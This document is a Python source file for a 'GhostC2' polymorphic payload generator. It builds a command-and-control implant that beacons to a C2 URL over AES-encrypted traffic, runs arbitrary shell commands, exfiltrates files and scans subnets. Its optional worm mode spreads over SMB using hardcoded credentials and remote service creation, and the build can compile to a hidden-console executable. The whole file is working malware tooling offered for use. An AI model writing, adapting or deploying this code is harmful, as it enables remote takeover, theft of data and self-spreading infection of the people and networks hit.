import os
import sys
import random
import string
import subprocess
import argparse
from datetime import datetime

PAYLOAD_TEMPLATE = '''\
import os
import sys
import time
import socket
import json
import requests
import subprocess
import base64
import random

key = {aes_key_literal}

def aes_encrypt(plaintext):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes
    import base64

    
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return base64.b64encode(iv + ct_bytes).decode()

CLIENT_ID = "{client_id}"

SLEEP_TIME = 15
JITTER_RANGE = 5

C2_URL = "{c2_url}"
RESULT_URL = "{result_url}"
IS_WORM = {is_worm}

def scan_subnet():
    base_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0] + '.'
    live_hosts = []
    for i in range(1, 255):
        ip = base_ip + str(i)
        try:
            sock = socket.create_connection((ip, 445), timeout=0.3)
            live_hosts.append(ip)
            sock.close()
        except:
            pass
    return live_hosts

def lateral_move(ip, username, password, local_payload_path):
    try:
        from impacket.smbconnection import SMBConnection
        from impacket.smbconnection import SessionError

        print(f"[+] Connecting to {{ip}} over SMB...")
        conn = SMBConnection(ip, ip)
        conn.login(username, password)
        print(f"[+] Authenticated to {{ip}}")

        with open(local_payload_path, "rb") as f:
            payload_data = f.read()

        remote_path = "Windows\\\\Temp\\\\worm.py"
        conn.putFile("C$", remote_path, lambda _: payload_data)
        print(f"[+] Payload uploaded to {{ip}}\\\\{{remote_path}}")

        service_name = "GhostDropper"
        command = "cmd.exe /c python C:\\\\Windows\\\\Temp\\\\worm.py"
        conn.createService(service_name, command)
        print(f"[+] Remote execution triggered on {{ip}}")

    except SessionError as e:
        print(f"[!] SMB SessionError: {{e}}")
    except Exception as ex:
        print(f"[!] Lateral move failed: {{ex}}")

def scan_network(subnet, ports):
    import ipaddress
    results = {{}}
    try:
        network = ipaddress.IPv4Network(subnet, strict=False)
        for ip in network.hosts():
            ip_str = str(ip)
            port_states = {{}}
            for port in ports:
                try:
                    sock = socket.create_connection((ip_str, port), timeout=0.5)
                    port_states[str(port)] = "open"
                    sock.close()
                except:
                    port_states[str(port)] = "closed"
            results[ip_str] = port_states
    except Exception as e:
        results["error"] = f"Scan failed: {{e}}"
    return results

def handle_browse(path):
    try:
        entries = []
        for entry in os.listdir(path):
            full_path = os.path.join(path, entry)
            if os.path.isdir(full_path):
                entries.append({{"name": entry, "type": "folder"}})
            else:
                entry_info = {{"name": entry, "type": "file"}}
                try:
                    entry_info["size"] = os.path.getsize(full_path)
                except Exception:
                    entry_info["size"] = "N/A"
                entries.append(entry_info)
        return json.dumps({{"path": path, "entries": entries}})
    except Exception as e:
        return json.dumps({{"error": str(e)}})

def {beacon_func}():
    if IS_WORM:
        print("[*] Worm mode enabled — beginning propagation...")
        targets = scan_subnet()
        print(f"[*] Discovered {{len(targets)}} live targets.")
        for ip in targets:
            lateral_move(ip, "admin", "password", "builds/ghost_payload_drop.py")

    {host_var} = socket.gethostname()
    registered = False

    while True:
        if not registered:
            reg_payload = {{
                "client_id": CLIENT_ID,
                "aes_key": base64.b64encode(key).decode()
            }}
            try:
                requests.post(C2_URL.replace("/beacon", "") + "/register", json=reg_payload, timeout=5)
                print("[*] AES key registered with C2")
                registered = True
            except Exception as e:
                print(f"[!] Registration failed: {{e}}")
                time.sleep(5)
                continue

        {data_var} = {{
            "client_id": CLIENT_ID,
            "hostname": {host_var},
            "payload": "idle"
        }}

        try:
            {raw_var} = json.dumps({data_var})
            {enc_var} = aes_encrypt({raw_var})
            {res_var} = requests.post(C2_URL, data={enc_var}.encode(), timeout=5)

            if {res_var}.status_code == 200:
                {resp_var} = {res_var}.json()
                {task_var} = {resp_var}.get("tasks", [])

                for {cmd_var} in {task_var}:
                    print(f"[+] Executing: {{{{{cmd_var}}}}}")
                    try:
                        task_json = json.loads({cmd_var})
                        action = task_json.get("action", None)
                    except Exception:
                        task_json = None
                        action = None

                    if action == "scan":
                        target_subnet = task_json.get("subnet", "")
                        ports = task_json.get("ports", [])
                        scan_results = scan_network(target_subnet, ports)

                        {result_obj} = {{
                            "hostname": {host_var},
                            "command": {cmd_var},
                            "result": scan_results
                        }}
                        {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                        requests.post(RESULT_URL, data={encrypted_result}.encode())
                        continue

                    if action == "getfile":
                        {file_path} = task_json.get("path", "")
                        try:
                            with open({file_path}, "rb") as f:
                                {b64data} = base64.b64encode(f.read()).decode()
                            {result_var} = f"[EXFIL:{file_path}]" + "\\n" + f"{b64data}"
                        except Exception as e:
                            {result_var} = f"[!] Failed to read file: {{e}}"

                    elif action == "browse":
                        path = task_json.get("path", \"/\" if os.name != 'nt' else \"C:\\\\\\\\\")
                        {result_var} = handle_browse(path)

                    elif action == "shell":
                        command = task_json.get("command", "")
                        try:
                            {out_var} = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
                            {result_var} = {out_var}.decode().strip()
                        except subprocess.CalledProcessError as e:
                            {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"

                    else:
                        if {cmd_var}.startswith("scan "):
                            parts = {cmd_var}.split("ports:")
                            target_subnet = parts[0].replace("scan", "").strip()
                            ports = [int(p) for p in parts[1].split(",")]
                            scan_results = scan_network(target_subnet, ports)

                            {result_obj} = {{
                                "hostname": {host_var},
                                "command": {cmd_var},
                                "result": scan_results
                            }}
                            {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                            requests.post(RESULT_URL, data={encrypted_result}.encode())
                            continue

                        if {cmd_var}.startswith("getfile "):
                            {file_path} = {cmd_var}.split(" ", 1)[1]
                            try:
                                with open({file_path}, "rb") as f:
                                    {b64data} = base64.b64encode(f.read()).decode()
                                {result_var} = f"[EXFIL:{file_path}]" + "\\n" + f"{b64data}"
                            except Exception as e:
                                {result_var} = f"[!] Failed to read file: {{e}}"

                        elif {cmd_var}.startswith("browse "):
                            path = {cmd_var}[7:].strip()
                            {result_var} = handle_browse(path)

                        else:
                            try:
                                {out_var} = subprocess.check_output({cmd_var}, shell=True, stderr=subprocess.STDOUT, timeout=10)
                                {result_var} = {out_var}.decode().strip()
                            except subprocess.CalledProcessError as e:
                                {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"

                    print(f"[>] Sending result:\\n{{{{{result_var}}}}}")

                    {result_obj} = {{
                        "hostname": {host_var},
                        "command": {cmd_var},
                        "result": {result_var}
                    }}
                    {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
                    requests.post(RESULT_URL, data={encrypted_result}.encode())

        except Exception as e:
            print(f"[!] Beacon failed: {{e}}")

        jitter = random.uniform(-JITTER_RANGE, JITTER_RANGE)
        sleep_time = max(1, SLEEP_TIME + jitter)
        time.sleep(sleep_time)

if __name__ == "__main__":
    {beacon_func}()
'''




# === Helpers ===
def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))

def generate_variable_names():
    return {
        'beacon_func': rand_name(),
        'host_var': rand_name(),
        'data_var': rand_name(),
        'raw_var': rand_name(),
        'enc_var': rand_name(),
        'res_var': rand_name(),
        'resp_var': rand_name(),
        'task_var': rand_name(),
        'cmd_var': rand_name(),
        'out_var': rand_name(),
        'result_var': rand_name(),
        'result_obj': rand_name(),
        'encrypted_result': rand_name(),
        'file_path': rand_name(),
        'b64data': rand_name()
    }

def generate_payload(c2_url, result_url, output_path, is_worm, aes_key):


    var_names = generate_variable_names()

    script_dir = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.abspath(os.path.join(script_dir, ".."))
    abs_utils_path = os.path.join(repo_root, "utils")
    abs_utils_path = abs_utils_path.replace("\\", "\\\\")

    client_id = rand_name(10)
    aes_key_literal = repr(aes_key)  # add above the format call if not already done

    filled_code = PAYLOAD_TEMPLATE.format(
        client_id=client_id,
        c2_url=c2_url,
        result_url=result_url,
        abs_utils_path=abs_utils_path,
        is_worm=is_worm,
        aes_key_literal=aes_key_literal,  # ✅ include this
        **var_names
    )


    with open(output_path, 'w') as f:
        f.write(filled_code)

    print(f"[+] Polymorphic payload written to: {output_path}")
    print(f"[+] Payload Client ID: {client_id}")

def compile_to_exe(source_path):
    print(f"[+] Compiling {source_path} to .exe...")
    build_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--distpath", "builds",
        "--workpath", "builds/temp",
        "--specpath", "builds/temp",
        source_path
    ]
    subprocess.run(build_cmd)
    print("[+] Compilation complete.")

# === Entrypoint ===
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GhostC2 Polymorphic Payload Generator")
    parser.add_argument("--c2", required=True, help="C2 beacon URL")
    parser.add_argument("--result", required=True, help="C2 result post URL")
    parser.add_argument("--exe", action="store_true", help="Compile payload to .exe using PyInstaller")
    parser.add_argument("--bat", action="store_true", help="Placeholder for batch output (not implemented)")
    parser.add_argument("--py", action="store_true", help="Export raw .py file only")
    parser.add_argument("--ps1", action="store_true", help="Placeholder for PowerShell output (not implemented)")
    parser.add_argument("--obfuscate", action="store_true", help="Apply string or function obfuscation")
    parser.add_argument("--encrypt", action="store_true", help="Apply additional encryption layer")
    parser.add_argument("--persist", action="store_true", help="Add persistence stub")
    parser.add_argument("--worm", action="store_true", help="Enable self-propagation mode")
    parser.add_argument("--output", help="Custom output filename for payload")
    parser.add_argument("--aes", help="Base64-encoded AES-256 key for encryption")

    args = parser.parse_args()

    # AES key handling (optional per-payload encryption)
    if args.aes:
        import base64
        try:
            aes_key = base64.b64decode(args.aes)
            if len(aes_key) != 32:
                raise ValueError("AES key must be exactly 32 bytes")
        except Exception as e:
            print(f"[!] Invalid AES key: {e}")
            sys.exit(1)
    else:
        aes_key = b"ThisIs32ByteAESKey_For_GhostC2!!"  # fallback static key


    os.makedirs("builds", exist_ok=True)

    if args.output:
        output_path = args.output
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"ghost_payload_{timestamp}.py"
        output_path = os.path.join("builds", filename)

    generate_payload(args.c2, args.result, output_path, args.worm, aes_key)


    if args.exe:
        compile_to_exe(output_path)